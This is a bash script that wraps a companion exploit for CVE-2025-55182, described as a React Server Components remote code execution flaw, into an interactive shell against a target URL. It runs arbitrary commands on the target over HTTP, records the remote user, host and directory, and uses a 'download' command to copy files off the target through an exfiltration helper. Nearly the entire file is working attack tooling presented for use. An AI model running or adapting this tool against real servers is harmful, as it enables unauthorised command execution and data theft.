#!/bin/bash
#
# shell.sh - Interactive shell for CVE-2025-55182
#
# Provides a pseudo-interactive shell experience over the RCE vulnerability.
# Each command is executed via exploit-redirect.sh with output displayed.
#
# Usage: ./shell.sh <target_url>
#
# Example:
#   ./shell.sh http://localhost:3443
#

# ------------------------------------------------------------
# Exit the script when something goes bad
# ------------------------------------------------------------
set -e

# ------------------------------------------------------------
# Ensure script runs from its own directory
# ------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ------------------------------------------------------------
# Paths
# ------------------------------------------------------------
EXPLOIT_SCRIPT="$SCRIPT_DIR/exploit-redirect.sh"
HISTORY_FILE="$HOME/.react2shell_history"
EXFIL_SCRIPT="$SCRIPT_DIR/exfil-file.sh"

# ------------------------------------------------------------
# Colors configuration
# ------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ------------------------------------------------------------
# Shell state
# ------------------------------------------------------------
TARGET=""
CWD="/"
HOSTNAME="unknown"
USER="unknown"

usage() {
    echo "Usage: $0 <target_url>"
    echo ""
    echo "Interactive shell over CVE-2025-55182 RCE"
    echo ""
    echo "Example:"
    echo "  $0 http://localhost:3443"
    echo ""
    echo "Built-in commands:"
    echo "  exit, quit    - Exit the shell"
    echo "  help          - Show this help"
    echo "  cd <dir>      - Change directory (tracked locally)"
    echo "  download <f>  - Download file using exfil-file.sh"
    echo "  !<cmd>        - Run local command"
    echo ""
    exit 1
}

# ------------------------------------------------------------
# Logging helpers
# ------------------------------------------------------------
log_info()    { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; }
log_step()    { echo -e "\n${BOLD}${CYAN}=== $1 ===${NC}\n"; }

# ------------------------------------------------------------
# Dependency checks
# ------------------------------------------------------------
check_deps() {
    if [[ ! -x "$EXPLOIT_SCRIPT" ]]; then
        log_error "$EXPLOIT_SCRIPT not found!"
        exit 1
    fi
}

# ------------------------------------------------------------
# Remote command execution
# ------------------------------------------------------------
exec_remote() {
    local cmd="$1"

    # Prepend cd to maintain working directory
    if [[ "$CWD" != "/" ]]; then
        cmd="cd $CWD && $cmd"
    fi

    "$EXPLOIT_SCRIPT" -q "$TARGET" "$cmd" 2>/dev/null
}

# ------------------------------------------------------------
# Target initialization
# ------------------------------------------------------------
init_target_info() {
    log_info "Connecting to $TARGET..."

    HOSTNAME=$(exec_remote "hostname || echo unknown" | tr -d '\r\n')
    USER=$(exec_remote "whoami || echo unknown" | tr -d '\r\n')
    CWD=$(exec_remote "pwd || echo /" | tr -d '\r\n')

    if [[ -z "$CWD" ]]; then
        CWD="/"
    fi

    [[ -z "$CWD" ]] && CWD="/"

    echo ""
    log_success "Connected"
    echo -e "  User: ${CYAN}$USER${NC}"
    echo -e "  Host: ${CYAN}$HOSTNAME${NC}"
    echo -e "  CWD:  ${CYAN}$CWD${NC}"
    echo ""
    log_warn "Each command is a new HTTP request"
    echo ""
}

# ------------------------------------------------------------
# Prompt rendering
# ------------------------------------------------------------
get_prompt() {
    # Shorten CWD for display
    local display_cwd="$CWD"
    [[ ${#display_cwd} -gt 40 ]] && display_cwd="...${display_cwd: -37}"

    echo -e "${GREEN}${USER}@${HOSTNAME}${NC}:${BLUE}${display_cwd}${NC}\$ "
}

# ------------------------------------------------------------
# Built-in commands
# ------------------------------------------------------------

# Handle cd
handle_cd() {
    local dir="$1"

    [[ -z "$dir" ]] && dir="~"

    # Resolve the directory on the target
    local new_cwd
    new_cwd=$(exec_remote "cd '$dir' && pwd" | tr -d '\r\n')

    if [[ -n "$new_cwd" ]]; then
        CWD="$new_cwd"
    else
        log_error "cd: no such directory: $dir"
    fi
}

# Handle download command
handle_download() {
    local remote_file="$1"
    local local_file="$2"

    [[ -z "$remote_file" ]] && { log_error "Usage: download <remote> [local]"; return; }


    # Default local filename
    [[ -z "$local_file" ]] && local_file="$(basename "$remote")"

    # Resolve path if relative
    [[ "$remote_file" != /* ]] && remote_file="$CWD/$remote_file"

    log_info "Downloading $remote_file -> $local_file"

    # Exfil script existence
    if [[ -x "$EXFIL_SCRIPT" ]]; then
        "$EXFIL_SCRIPT" "$TARGET" "$remote_file" "$local"
    else
        local content_file=$(exec_remote "cat '$remote_file'" > "$local_file" && log_success "Saved to $local_file")

        if [[ -n "$content_file" ]]; then
            echo -e "${GREEN}[+]${NC} Saved to: $local_file"
        else
            log_error "Failed to download file"
        fi
    fi
}

# ------------------------------------------------------------
# REPL loop
# ------------------------------------------------------------
repl() {
    [[ -f "$HISTORY_FILE" ]] && history -r "$HISTORY_FILE"

    while true; do
        local prompt cmd
        prompt=$(get_prompt)

        if ! read -e -p "$prompt" cmd; then
            echo ""
            break
        fi

        [[ -z "$cmd" ]] && continue
        history -s "$cmd"

        case "$cmd" in
            exit|quit|q)
                break
                ;;
            help)
                usage
                ;;
            cd\ *)
                handle_cd "${cmd#cd }"
                ;;
            cd)
                handle_cd ""
                ;;
            download\ *)
                # shellcheck disable=SC2086
                handle_download ${cmd#download }
                ;;
            \!*)
                eval "${cmd#!}"
                ;;
            *)
                exec_remote "$cmd"
                ;;
        esac
    done

    history -w "$HISTORY_FILE"
    log_info "Goodbye"
}

# Entry point
main() {

    check_deps

    echo ""
    echo -e "${BOLD}${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${RED}║${NC}  ${BOLD}CVE-2025-55182 Interactive Shell${NC}                        ${BOLD}${RED}║${NC}"
    echo -e "${BOLD}${RED}║${NC}  React Server Components RCE                              ${BOLD}${RED}║${NC}"
    echo -e "${BOLD}${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if [[ $# -lt 1 ]]; then
        usage
    fi

    TARGET="$1"


    init_target_info
    repl
}

main "$@"
